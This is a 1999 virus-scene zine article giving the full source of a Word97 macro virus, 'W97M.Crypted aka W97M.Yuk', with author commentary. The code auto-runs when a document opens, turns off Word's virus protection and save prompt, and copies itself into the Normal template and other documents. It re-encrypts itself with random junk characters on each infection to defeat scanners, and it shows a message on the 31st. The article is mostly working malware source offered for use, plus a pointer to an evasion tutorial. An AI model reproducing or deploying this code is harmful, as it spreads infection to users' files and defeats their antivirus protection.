<-------------------------//LineZer0 Network 99\\------------------------->
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=


~Word97Macro.Crypted aka W97M.Yuk v1.1~
=======================================

Identification:
~~~~~~~~~~~~~~~

	~Virusname: 	WM97.Crypted aka W97M.Yuk
	~Version:	v1.1
	~Origin:  	Austria
	~Author:	jack twoflower / [LineZer0 & Metaphase]
	~Date:		June, 1999

Features:
~~~~~~~~~

	~Application	Word97	
	~Payload: 	Yes, just a little message
	~Stealth: 	Nope, not yet
	~Retro: 	Nope
	~SR-1 comp.: 	Yes
	~Polymorph:	Nope
	~Encrypted: 	Yes, changes encryption every infection


    Heya ppl out there! This is the second version of the encrypted virus
named 'Crypted' aka 'Yuk' ;) The main change to the first version is that
the code encrypts itself every infection new. Everytime a document gets
infected, Normaltemplate changes it's encrypted code.

About the encryption:

    This virus here uses some kind of 'junk code' encryption. This idea 
I found on a sunny afternoon lying in my bed after a long night. ;) Dead
tired from coding last night, some idea about this method came into my
mind...(what a great story ;) ) and so here it is...see the result below


-------> code starts here <---------

Sub AutoOpen(): Dim jack(14) As String

> This procedure encrypts the code when the document or template is opened
> It adds a AutoClose procedure.

jack(1) = "SuÊßİbİ Autoõİ÷ÙÒócúĞ÷ŞlosÕÛöe()"
jack(2) = "Oµä×n E·ºüÕrr¸·ÏñoØÍğÀĞréñĞ ø»èÇ·ReáÇ»µØæsume NõÑöexò·´ĞtÚğú¶çü:µ ıöèÔc·µ = ChğÕÜr(6×5ÑÌô»Ïõ) + òëChr(¼øÂáí11Ë¸¸ŞÜ6)Ôèİ + Chr(1äÃõ½æù1ŞÚÂ6) + ChìÓñ÷Àür(11÷Ìİ»Ë4)Ç·Öæ ä+ Chr(105ï) +¶¸Ü Chr(½98) + ¶ÆçCºæÙ¶üõhŞéÔâÜr(1Ìôµ17ùø÷¾ç) Şøçµğ+ ChrÃñÍµÍ(¿ñöµó116)Ò +äùó ChîÖr(1ÓÉµ01) + ChôùÜ¶ràß¼È(32) ÌÁ+ CúÌİ´Îûhr(86) + CêÕ¶¿hr(66) + CËhÄĞòÆ·r(95) + Chr(ĞÉîëÏŞ7ü·ÖÎ8ÓÃ¹Ğ)ÌÌøÔñÎ + ûÅ¼ñCÒ¼ÌhrÊ(À97) + C¹¹hrÍòøÊÅ(109Şãóô) ¶×¿½+ Chr(1ĞÙ·ïÅ01) + C÷¸h¸ÃìüÈr(32) + éÃChİ´ÇêÓr(61)øû è´Üú+ CéÌ¹Ì½hr(¾Ø3éÔı2¹âÍ) + ChÖ¾äír(34¾»æåÍ) + Chër(6½Ü½ìÌÜ7èŞÌôĞ) + CÙÀéÙâhr(114) İ¶+Çè ChÖäìÕ»r(121óù) + Chïr(´àèî1ÎØëâÏü12) +¾»È¿â ChrÀ÷(116) ÙÜÌ·+¸ò ChrôıØşçş(1ÂµÉãÃÙ0×éÃĞû1) + äæChrÒÔèıé(100ü½ò) + Chr(ûòºÆ3äíñØ4)"
jack(3) = "c¹Æß¿Ö·oµŞéü = Chr(ã67)éÄ + ChrÌ¿ë(11àÅŞŞ4îÑ) áş»+ËÑ¼ú¶ Chr(óùÈá1¸¶21îıİàÅò)ÅÑŞÑ +¼Ëú Chr(¸¸¸È1â¾ååà1¿2)á + ChºÉr(116) +üÒúÏ Chr¸Ó¿íÛ(Ë´1û0Äë1) + ChrÍì(100à):ºŞïÒíô täüÀ ·×Í=ÂóÉÇ ChrÀ(×ô99âö) Ì»Ã+ Chr(58) + ¼´èÙCæ¹hrÉÅêØ(9ûûË2)½Ç×¼Â +ĞµÄÊïç ÖChr(110) + Ch¼Ñâşér(ğïÌà1ğíèÂ17) É+ ChrãÅĞùöŞ(46) ÷ø+åóİĞã¸ ChòõìÓÜãr(11ÈØêúïö5) Şé+ÏÁ ChrÖæÊû(121)şÄ¹åı Ñëì+ ChØ¸Öürµ·Ì¶åÛ(115)"
jack(4) = "OptiıĞôùons.÷»ÅúàVÛòiärusProtÉêëşÕeÙÔàîÜctionß×´Şû ¾ÀÃí÷= Falseéú: Oü¿Ìõ½ptionsÉÛ.SÎãÄaòõÏñvÃe¼´ÉÁNormaÍÆÁÓlPrÙÌëøompt = False"
jack(5) = "vÕîÑÆúc×ÃÏá Öçæ¸= Ø¹¸ÓèíThÁØÏisDo¾Òçcument.ÇúºVBöPÈÎroÅãjeÖéct.VBComÚÂÖïÆpÍäİonents(co).CodeMÃåÍÜÈóoÀâduæµŞlÙe.ÍÕLiÜúË¸ânesØ(1,¶ã 29ÛÆĞé)"
jack(6) = "OëµàÓïpeıÉËÀn tºõËÌòµ For Outß»ÑµØßp½ut»µİ½ç As #1õä·: ÅÎÄÓæØPÇ½òÌÍörºıint Î#ÔÙïİÀ1ùØ, c: Pôçø¾Úrint ÷´â#´1ô, vcîÌ: Cloğşæse #1"
jack(7) = "IfÊóÉê LenŞê»Ã(NoÊïrmäÃäalTemİèplate.ÚíÆVÜê´×BProıÔÃşçjeúù·câ»È¾t.VBComÒpÊô¸ÎºoòÓÚÚÆnÂûİ¾ºenÛßÏtØs(ÓÁÅócùİÛĞàÒoÎüé´).NameÀã¼Şöü) = 0şá¶ T¾hen ÉÕNoåÓrmalïİêÑTúİıempõ¸ìÀlateæÍ.VBÁØProjeÕşø¹¼ÖctÚÚÈ.VBComponents.ôúûûÑ¸IºÙ¸ì¸mó÷Â´ÏÔpÜ¼¿õort tĞÂİ"
jack(8) = "If LenÆşÊõ(ActiveDèocumeûnt.ÀVBProjŞ¸·ÚÒ¾ec½t.ÄÀVBCoàÔĞùmponenÁÈÃòÜtôÃèùÁÕsÚµÎ¾İó(cÑ×o)Ü.ÊßËÕñµNameèÄ) = 0 Then AíÒÜàÊàc´tîÎiÏvïüñÃµeúÓùöæ»Dóäoc¹òó·ument.öÚVBProÍÃjectÊà.VBCéÔ×ào¶¶¼µmpoæneónts.Import t"
jack(9) = "TĞáËÜ½áhêìïùiò¼ËæØ´sDÇ½÷ÈæoÄÏÇæ´óc¿çÒÎ¶uçèïÑµment¶ä÷êş.Ğ¹æVBÌProjeËíctğ¾Í.VBComĞ×ÕóØäpæôµ×o¶nêÜıöeÄòşòÓÀnts(cïÒİØàÍo)òêÁ.Cêµ÷ŞşodeModuôåleüÉ¹İÎó.ŞĞäDeletãeLÁıine÷üİéÛsŞÛ·õÜ Ë¸÷üİê30, 9"
jack(10) = "ThçâëöisDocumëîİenışÅÚtÒé.åş¶VÙÍÔĞäBØPrÒ÷ojºô·üäect.×÷VBÈñĞÒÇComponents(ÁÓñÉéÛcòçñÒØËoÒÌĞó).CodÛ´âÂeModÕuğÆøÙÇÔle.DeüĞül¶Àù×ete¾LinesÚı¼ 30ì, òë5ï"
jack(11) = "IõÖ÷·ıäf DÏaòy(Nìõow(ÊÍË»Ñ¾))İ =ßèı´ñù üÛúÉı´31··ÔãÈì TÀÌhenúÃ Msg¶øBû·èox îºCÃêÇâèhrÊ(ÇÏ11Ç÷0) +Öîã¾ ChêæÄür(6Â9) + Chr¼(÷âÍó86ë) Ò+ Chr÷ö¾İË(6ßüµ´ÃÙ9)Ø»Ò +Ô¶ Chr(82) + å×ÍÍöåChá¹Ëû¶r(àÚ3×¿È2) üŞÈ¿òô+ ChÙüÛèÅr(1üôÊ¿Ò0æı7) ïéÖ+½ CÂŞÛhrìÜ(èÂäºç¿78)Îë +ıÍÕÌçú Å»½üÇCÜé»hİ¼ÑÔrÏşüë(79) ê+èÕíÅÉ ç¼şÆøÑCÂÄÍíÄhr(8ÛåáÜ7»÷ÀãÚõ) +÷ÅìØ Chr(32åûø) + C÷hrîæİò(1ÓÀ10) Ğ´Íé+ÜòØİÜº CİhrÓÁÆĞº(79Ì)¾ÔÚêïÌ ¾+ïØ âChrÙà·õù(8ììÎ¹Ï4) +Çç¹ Chr(72)ãøãäèİ + åä÷ChëÀÃöµr(73) Òúê¹Ø¿+ şÚChrôÆï´(78) é+ Cühr(7å1ş) + ¾Chçr(33)ÂÀëÏºØ + éı¾CşÙİëhr(3Ê¸ş2ĞÈÜ) +µ¶öÓ¾Í Chr(16ö9íŞíù) +ËÃØÏúà ëØChr(57) + ÎÎßŞêCh»ãïr(57ğÛ×å)¿ÖõÒ ÔÑ÷+ ChÉ¹ê´Øör(3É×Àºøù2) Ö×Ôñû×+ ËüáüôóCÎí´õÌËhr(àÓÁìòÌ106)º + CÙô¸ø·Îhr(çÛÁÛ9Ûô7)ŞŞ ãİÖîàÒ+ Chr(9¾èÀõê9ïàÜÛçÁ) é¾ÑßÜ+ùÀ ChrÍáşĞÑÍ(107Ã´òûøõ)¾¸ +úã·Íáş ChØr(116) ÄÀéÇ+ïØ ChöÆÖÉr(1ÏãÑëöé19Êñà)ğ + ´óÙChr(üüå·111)"
jack(12) = "If¼ßºç ÄôActivşüØõeDocæèçumeÎ»nt¾ò¶ã.Ç¸Á÷SaveáòÖşdë½ = ÆFaışlÈÎµásÔÆÖáe TÚÜĞùhen ´İÌÈActivÚeDocumeÏÀÍönt.SavÑÊÎüâòeAÄÂ¿Òñs Aëü¾âÛòctiÔó·½veÄ¾ÒëÏÕDocum÷Ğ¹üÒ×ent.ÔâÙ¼FullNìÙíÚĞµame"
jack(13) = "ActiveD÷ÃÂÌÆocumóäõã»eãõÓnt.ÍCloóÆÚôse wdDÇîıoNot¶úåSaÎv÷øÇâeCşhanÀº¾»gâààes"
jack(14) = "EnÉÓ½îÑĞd×ÛÇÙ ¸ÑSub"

> The encrypted code for the AutoClose proc...

For i = 1 To 14: vc = vc & jacky(jack(i)): Next i

> Call the decryption function...

If ThisDocument.VBProject.VBComponents("Crypted").CodeModule.Lines(30, 1) = "" Then ThisDocument.VBProject.VBComponents("Crypted").CodeModule.InsertLines 30, vc

> Insert the code if the code is not already inserted...

If MacroContainer = NormalTemplate Then

> If this here is the template then...

With ThisDocument.VBProject.VBComponents("Crypted").CodeModule
For j = 2 To 15: k = .Lines((28 + j), 1): For l = 1 To Len(k): m = Mid(k, l, 1)
For s = 1 To Int(Rnd * 2) + 1: e = e & Chr(255 - Int(Rnd * 75)): Next s
v = v & m & e: e = "": Next l: .ReplaceLine j, "jack(" & j - 1 & ") = """ & v: v = "": Next j: End With
End If: End Sub

> Get the decrypted code and encrypt it again with a new random junk code,
> after that insert it again.

Function jacky(c As String)

> This here decrypts the code...

For o = 1 To Len(c): z = Mid(c, o, 1)

> Make a loop from the first to the last sign of the current array
> 'z' is the current character.

If Asc(z) > 177 Then z = ""

> If 'z' is junk code then clear 'z' 

x = x & z: Next o: jacky = x & vbCr

> Next character - insert the decrypted array into the

End Function
' W97M.Crypted aka W97M.Yuk v1.1 written by Jack Twoflower [LineZer0]&[Metaphase]

-------> code ends here <-------


     So...if you want to know more about this and other encryption methods
read my tutorial 'Tricks to make your macro unscannable'. 0k, hope you like
this shit! ;)


=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
<-------------------------\\LineZer0 Network 99//------------------------->